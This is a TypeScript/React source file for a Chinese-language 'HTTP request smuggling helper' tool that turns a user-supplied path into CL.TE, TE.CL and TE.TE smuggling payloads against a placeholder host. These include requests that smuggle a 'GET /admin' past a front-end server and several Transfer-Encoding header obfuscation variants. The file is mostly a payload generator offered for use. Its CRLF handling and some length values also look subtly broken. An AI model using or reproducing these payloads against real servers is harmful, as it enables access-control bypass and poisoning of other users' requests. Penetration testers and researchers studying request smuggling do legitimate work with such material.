import SimpleTool from '../../_shared/SimpleTool';
import type { ToolProps } from '../../types';

const TYPE_OPTIONS = [
  { value: 'cl-te', label: 'CL.TE' },
  { value: 'te-cl', label: 'TE.CL' },
  { value: 'te-te', label: 'TE.TE' },
];

const CRLF = '\\r\\n';

const generateCLTE = (path: string): string => {
  const p = path.trim() || '/';
  return [
    '=== CL.TE 请求走私 ===',
    '',
    '原理: 前端使用 Content-Length，后端使用 Transfer-Encoding',
    '前端转发请求体（按CL），后端按TE的chunk结束，剩余字节成为下一个请求的开头',
    '',
    '--- 攻击载荷 1: 前端投毒 ---',
    `POST ${p} HTTP/1.1${CRLF}Host: vulnerable.com${CRLF}Content-Length: 13${CRLF}Transfer-Encoding: chunked${CRLF}${CRLF}0${CRLF}SMUGGLED`,
    '',
    '实际发送字节 (可见化 \\r\\n):',
    `POST ${p} HTTP/1.1\\r\\nHost: vulnerable.com\\r\\nContent-Length: 13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\nSMUGGLED`,
    '',
    '--- 攻击载荷 2: 覆盖前端 CL ---',
    `POST ${p} HTTP/1.1${CRLF}Host: vulnerable.com${CRLF}Content-Length: 6${CRLF}Transfer-Encoding: chunked${CRLF}Transfer-encoding: anything${CRLF}${CRLF}0${CRLF}`,
    '',
    '--- 攻击载荷 3: 利用 CL 冲突 ---',
    `POST ${p} HTTP/1.1${CRLF}Host: vulnerable.com${CRLF}Content-Length: 4${CRLF}Content-Length: 20${CRLF}${CRLF}0${CRLF}GET /admin HTTP/1.1${CRLF}Host: vulnerable.com${CRLF}${CRLF}`,
    '',
    '说明: 前端按 CL 读取固定长度，后端按 TE chunked 解析，造成残余字节注入下一请求',
  ].join('\n');
};

const generateTECL = (path: string): string => {
  const p = path.trim() || '/';
  return [
    '=== TE.CL 请求走私 ===',
    '',
    '原理: 前端使用 Transfer-Encoding，后端使用 Content-Length',
    '',
    '--- 攻击载荷 1: 后端投毒 ---',
    `POST ${p} HTTP/1.1${CRLF}Host: vulnerable.com${CRLF}Content-Length: 3${CRLF}Transfer-Encoding: chunked${CRLF}${CRLF}8${CRLF}SMUGGLED${CRLF}0${CRLF}`,
    '',
    '可见化 \\r\\n:',
    `POST ${p} HTTP/1.1\\r\\nHost: vulnerable.com\\r\\nContent-Length: 3\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n8\\r\\nSMUGGLED\\r\\n0\\r\\n`,
    '',
    '--- 攻击载荷 2: 注入完整请求 ---',
    `POST ${p} HTTP/1.1${CRLF}Host: vulnerable.com${CRLF}Content-Length: 6${CRLF}Transfer-Encoding: chunked${CRLF}${CRLF}0${CRLF}${CRLF}GET /admin HTTP/1.1${CRLF}Host: vulnerable.com${CRLF}Content-Length: 15${CRLF}${CRLF}x=1${CRLF}${CRLF}`,
    '',
    '说明: 前端按 TE chunked 读完（到0\\r\\n\\r\\n结束），后端按 CL 只读3/6字节，剩余作为新请求',
  ].join('\n');
};

const generateTETE = (path: string): string => {
  const p = path.trim() || '/';
  return [
    '=== TE.TE 请求走私 ===',
    '',
    '原理: 前后端都支持 Transfer-Encoding，但通过混淆使其一方不识别',
    '',
    '--- 攻击载荷 1: 大小写混淆 ---',
    `POST ${p} HTTP/1.1${CRLF}Host: vulnerable.com${CRLF}Transfer-Encoding: chunked${CRLF}transfer-encoding: cow${CRLF}${CRLF}0${CRLF}SMUGGLED`,
    '',
    '--- 攻击载荷 2: 空格混淆 ---',
    `POST ${p} HTTP/1.1${CRLF}Host: vulnerable.com${CRLF}Transfer-Encoding : chunked${CRLF}${CRLF}0${CRLF}SMUGGLED`,
    '',
    '--- 攻击载荷 3: 逗号混淆 ---',
    `POST ${p} HTTP/1.1${CRLF}Host: vulnerable.com${CRLF}Transfer-Encoding: chunked, cow${CRLF}${CRLF}0${CRLF}SMUGGLED`,
    '',
    '--- 攻击载荷 4: Tab混淆 ---',
    `POST ${p} HTTP/1.1${CRLF}Host: vulnerable.com${CRLF}Transfer-Encoding:\\tchunked${CRLF}${CRLF}0${CRLF}SMUGGLED`,
    '',
    '--- 攻击载荷 5: 换行混淆 ---',
    `POST ${p} HTTP/1.1${CRLF}Host: vulnerable.com${CRLF}Transfer-Encoding: chunked${CRLF}X: x${CRLF}\\tTransfer-Encoding: chunked${CRLF}${CRLF}0${CRLF}SMUGGLED`,
    '',
    '--- 攻击载荷 6: 编码混淆 ---',
    `POST ${p} HTTP/1.1${CRLF}Host: vulnerable.com${CRLF}Transfer-Encoding: chunked${CRLF}Transfer-Encoding: x${CRLF}${CRLF}0${CRLF}SMUGGLED`,
    '',
    '说明: 当一端因混淆而忽略 TE，退化为 CL 解析，造成走私',
  ].join('\n');
};

const generate = (type: string, path: string): string => {
  switch (type) {
    case 'te-cl': return generateTECL(path);
    case 'te-te': return generateTETE(path);
    default: return generateCLTE(path);
  }
};

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="HTTP请求走私辅助"
    paramsConfig={[
      { name: 'type', label: '走私类型', type: 'select', options: TYPE_OPTIONS, default: 'cl-te' },
    ]}
    execute={(
      input: string,
      _mode: string,
      params: Record<string, unknown>,
    ): string => generate(
      (params.type as string) ?? 'cl-te',
      input,
    )}
  />
);

export default ToolComponent;
